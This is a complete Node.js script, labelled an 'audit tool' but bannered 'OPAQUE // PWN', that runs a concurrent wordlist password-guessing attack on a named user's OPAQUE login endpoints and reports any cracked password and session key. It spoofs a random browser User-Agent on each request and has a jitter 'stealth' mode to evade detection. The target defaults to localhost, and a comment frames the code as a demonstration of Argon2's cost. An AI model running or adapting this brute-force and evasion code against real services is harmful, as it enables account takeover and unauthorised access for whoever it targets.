// advanced_attack.js - Enterprise Grade OPAQUE Audit Tool
import fs from 'fs';
import path from 'path';
import fetch from 'node-fetch';
import chalk from 'chalk';
import figlet from 'figlet';
import crypto from 'node:crypto';
import yargs from 'yargs/yargs';
import { hideBin } from 'yargs/helpers';
import cliProgress from 'cli-progress';
import UserAgent from 'fake-useragent';
import { argon2id } from 'hash-wasm';

// Import OPAQUE Library
import init, { Login } from './node_modules/@47ng/opaque-client/opaque-client.js';

// --- CLI CONFIGURATION ---
const argv = yargs(hideBin(process.argv))
    .option('url', { alias: 't', type: 'string', default: 'http://localhost:3000', description: 'Target URL' })
    .option('user', { alias: 'u', type: 'string', demandOption: true, description: 'Target Username' })
    .option('wordlist', { alias: 'w', type: 'string', default: 'passwords.txt', description: 'Path to dictionary file' })
    .option('threads', { alias: 'n', type: 'number', default: 4, description: 'Number of concurrent threads' })
    .option('jitter', { alias: 'j', type: 'boolean', default: false, description: 'Enable random delays (Stealth mode)' })
    .help()
    .argv;

// --- HELPERS ---
const binToJson = (u8) => Array.from(u8);
const jsonToBin = (arr) => new Uint8Array(arr);
const toHex = (u8) => Buffer.from(u8).toString('hex');
const strToBytes = (str) => new Uint8Array(Buffer.from(str, 'utf-8'));
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// Generate valid salt from username (Matches Client Logic)
function generateSalt(username) {
    return new Uint8Array(crypto.createHash('sha256').update(username).digest());
}

// Argon2id Wrapper
async function deriveSlowPassword(password, username) {
    const salt = generateSalt(username);
    return await argon2id({
        password: password,
        salt: salt, 
        parallelism: 1, iterations: 2, memorySize: 512, hashLength: 32,
        outputType: 'encoded'
    });
}

// --- WASM LOADER ---
async function loadWasm() {
    try {
        const wasmPath = path.resolve('./node_modules/@47ng/opaque-client/opaque-client_bg.wasm');
        const wasmBuffer = fs.readFileSync(wasmPath);
        await init(wasmBuffer);
    } catch (e) {
        console.error(chalk.red("CRITICAL: WASM Load Failed."), e);
        process.exit(1);
    }
}

// --- ATTACK WORKER ---
async function attackThread(password, progressBar) {
    const userAgent = new UserAgent(); // Spoof different browser every time
    const startHash = Date.now();

    // 1. HARDENING (The Bottleneck)
    // This demonstrates why Argon2 is good. It slows down the attacker's CPU.
    const hardenedPassword = await deriveSlowPassword(password, argv.user);
    
    // Stealth Jitter
    if (argv.jitter) await sleep(Math.random() * 500);

    try {
        const login = new Login();
        
        // 2. OPAQUE Start
        const request = login.start(hardenedPassword);

        // 3. Network: Login Init
        const res1 = await fetch(`${argv.url}/login-init`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': userAgent.toString() // Evasion
            },
            body: JSON.stringify({ 
                userId: argv.user, 
                startUploadArray: binToJson(request) 
            })
        });

        const data1 = await res1.json();

        if (data1.error) {
            login.free();
            progressBar.increment();
            return null; // Invalid User or Blocked
        }

        const serverResponse = jsonToBin(data1.serverResponseArray);
        
        // 4. Crypto Verification (The Check)
        let output;
        try {
            // Note: finish() takes 2 args based on our fixed version
            output = login.finish(hardenedPassword, serverResponse);
        } catch (e) {
            login.free();
            progressBar.increment();
            return null; // Wrong Password
        }

        // 5. Network: Login Finish
        let clientFinish = output.message || output;
        
        const res2 = await fetch(`${argv.url}/login-finish`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': userAgent.toString()
            },
            body: JSON.stringify({ 
                userId: argv.user, 
                clientFinishArray: binToJson(clientFinish) 
            })
        });

        const result = await res2.json();
        login.free();

        if (result.success || result.step === '2FA_REQUIRED') {
            let key = "HIDDEN";
            if(result.tempSessionKey) key = toHex(jsonToBin(result.tempSessionKey));
            
            return { password, key }; // CRACKED!
        }

    } catch (e) {
        // Network errors (ignore and continue)
    }
    
    progressBar.increment();
    return null;
}

// --- ORCHESTRATOR ---
async function main() {
    console.clear();
    console.log(chalk.red(figlet.textSync('OPAQUE // PWN', { font: 'Slant' })));
    console.log(chalk.gray(`v2.4.0 - Advanced Audit Tool`));
    console.log(chalk.white("=================================================="));
    console.log(chalk.bold(` TARGET  : `) + chalk.cyan(argv.url));
    console.log(chalk.bold(` USER    : `) + chalk.yellow(argv.user));
    console.log(chalk.bold(` WORDLIST: `) + chalk.white(argv.wordlist));
    console.log(chalk.bold(` THREADS : `) + chalk.magenta(argv.threads));
    console.log(chalk.bold(` STEALTH : `) + (argv.jitter ? chalk.green("ON") : chalk.red("OFF")));
    console.log(chalk.white("==================================================\n"));

    await loadWasm();

    if (!fs.existsSync(argv.wordlist)) {
        console.log(chalk.red(`❌ Wordlist not found: ${argv.wordlist}`));
        process.exit(1);
    }

    const passwords = fs.readFileSync(argv.wordlist, 'utf-8').split('\n').map(p => p.trim()).filter(p => p.length > 0);
    console.log(chalk.blue(`[*] Loaded ${passwords.length} unique payloads.`));
    console.log(chalk.blue(`[*] Initializing Argon2id/WASM Engine...`));

    // Progress Bar
    const bar = new cliProgress.SingleBar({
        format: chalk.cyan('{bar}') + ' | {percentage}% | {value}/{total} | ETA: {eta}s | Rate: {speed} p/s',
        barCompleteChar: '\u2588',
        barIncompleteChar: '\u2591',
        hideCursor: true
    });

    bar.start(passwords.length, 0, { speed: "0" });

    const startTime = Date.now();
    let activeThreads = 0;
    let index = 0;
    let cracked = null;

    // Concurrency Loop
    while (index < passwords.length && !cracked) {
        // Fill the pool
        while (activeThreads < argv.threads && index < passwords.length) {
            const pwd = passwords[index++];
            activeThreads++;
            
            // Spawn Worker (Non-blocking)
            attackThread(pwd, bar).then(result => {
                activeThreads--;
                if (result) {
                    cracked = result; // Found it!
                }
                // Calculate Rate
                const elapsed = (Date.now() - startTime) / 1000;
                const speed = (index / elapsed).toFixed(1);
                bar.update(index, { speed });
            });
        }
        
        // Wait briefly to let event loop handle promises
        if (cracked) break;
        await sleep(10);
    }

    // Wait for remaining threads if not cracked
    while (activeThreads > 0 && !cracked) await sleep(100);

    bar.stop();

    if (cracked) {
        console.log("\n");
        console.log(chalk.green("╔════════════════════════════════════════════╗"));
        console.log(chalk.green("║           PASSWORD CRACKED!                ║"));
        console.log(chalk.green("╚════════════════════════════════════════════╝"));
        console.log(chalk.white(` USER:     `) + chalk.bold.yellow(argv.user));
        console.log(chalk.white(` PASSWORD: `) + chalk.bgRed.white.bold(` ${cracked.password} `));
        console.log(chalk.white(` KEY:      `) + chalk.gray(cracked.key.substring(0, 30) + "..."));
        console.log("\n");
    } else {
        console.log(chalk.red("\n[-] Exhausted wordlist. No password found.\n"));
    }
    
    process.exit(0);
}

main();